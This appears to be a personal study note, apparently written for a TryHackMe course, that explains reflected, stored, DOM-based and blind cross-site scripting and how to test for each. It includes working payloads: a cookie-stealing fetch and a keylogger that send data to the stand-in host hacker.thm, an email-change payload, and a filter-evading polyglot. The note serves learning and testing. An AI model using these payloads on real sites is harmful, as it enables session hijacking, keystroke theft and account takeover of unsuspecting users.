# XSS
cross-site scripting is a vulnerability in which a website allows the execution of random JavaScript code through some input.
basically what happens in an XSS attack is the attacker finds a way to inject malicious JavaScript code into the website which will be executed by other users or the server itself.
this vulnerability is very dangerous since it is basically an [[RCE]] vector.
## Getting started with XSS
the first step in XSS is to identify the vulnerability, this can be easily done with a small proof of concept. a default payload for a JavaScript alert
this is done by injecting a simple payload 
> <script>alert('XSS');</script>

injecting this payload will pop an alert whenever the website is visited. so if the alert pops up, it means that the input is vulnerable to XSS;
>**NOTE:** sometimes, the website sanitizes the input, so there could be ways around this like encoding/decoding the input or something

After discovering the vulnerability, it's all just about executing an attack; for this there are different types of attacks that can be easily; here are some examples:
- Sessions stealing: this would send the user's identity to the attacker's website, example of an payload: `<script>fetch('https://hacker.thm/steal?cookie=' + btoa(document.cookie));</script>` 
- KeyLogging: this would log the users key strokes and usually sends it over to the attacker's website: example of a payload: `<script>document.onkeypress = function(e) { fetch('https://hacker.thm/log?key=' + btoa(e.key) );}</script>`
- Business Logic: this requires a little bit of understanding of the network resources of the server, as this can change from website to another, here is an example of a payload `<script>user.changeEmail('attacker@hacker.thm');</script>` 

## Reflected XSS
among the ways to detect an XSS, is through the Request URL, if the url parameters are not sanitized properly and are added to the website content, an attacker could inject their own code through the URL parameters and then send this over to a non suspicious user or embed the vulnerable url as frame.
![[reflected_xss_graph.png]]
### Potential impact
This attack is straight forward, if an attacker tricks the user into visiting the compromised URL.
The attacker could send links or embed them into an iframe on another website containing a JavaScript payload to potential victims getting them to execute code on their browser, potentially revealing session or customer information.
### Checking for Reflected XSS
this usually means testing every possible point of entry; these include:
- Parameters in the URL Query String
- URL File Path
- Sometimes HTTP Headers (although unlikely exploitable in practice)

after detecting the vulnerability, it's important to figure out where in the application this scripting is reflected to be able to determine which payloads are executable.
## Stored XSS  
in this scenario, an attacker is able to inject malicious code into the website's database which will then be activated every time a user visits the website page with the malicious code.
![[stored_xss_graph.png]]
this vulnerability is usually found in websites that allow users to store information, such as posts or comments, without properly sanitizing the text.
## Potential impact
The malicious JavaScript could redirect users to another site, steal the user's session cookie, or perform other website actions while acting as the visiting user.
the impact of this vulnerability is much much higher 
### Testing for Stored Xss
this usually means testing every possible entry point where data is stored. this includes:
- comments on a blog
- User profile information
- website listings
> sometimes developers would only limit client side input (client side sanitization) which can be bypassed by introducing values that the web application may not expect.

## [[DOM]] Based XSS
a [[DOM]] (Document object model) is a programming  interface for HTM and XML documents
DOM Based XSS is where the JavaScript execution happens directly in the browser without any new pages being loaded or data submitted to backend code;
this execution happens when the website JavaScript code acts on input or user interaction.
### Example 
for example, a website gets the content from the ``windows.location.hash`` parameter and then writes in onto the website; this means that if an attacker changes the value of this parameter, they can inject code into the webpage.
### Potential impact
Crafted links could be sent to potential victims, redirecting them to another website or stealing content from the user's session.
### Testing for DOM Based XSS
this can be challenging and usually requires some knowledge of JavaScript reading the source code to determine which variables can be controlled. and then we need to evaluate whether the values are ever written to the web page's DOM or passed to unsafe methods
## Blind XSS
very similar to stored XSS, with the small difference that in this type of vulnerability, the attacker can't see the effect of the payload.
### Example
an example scenario would be a contact form, if the message content doesn't get checked for any malicious code, then the code will get executed by the support ticket staff in the private web portal.
### Potential impact
using correct payload, this can give the attacker visibility about a lot of the private staff portal, things such as ursl, cookies, or even content.
so in theory, this attack is more dangerous since it's usually targeting staffs or admins.
### How to test for Blind XSS
testing for this kind of vulnerability requires a callback on execution to get some sort of feedback
a popular tool for blind XSS attacks is [[xsshunter]]
## Polyglot
An XSS polyglot is a string of text which can escape attributes, tags and bypass filters all in one. try the following code and see if it works when all else fails 
``jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */onerror=alert('THM') )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert('THM')//>\x3e``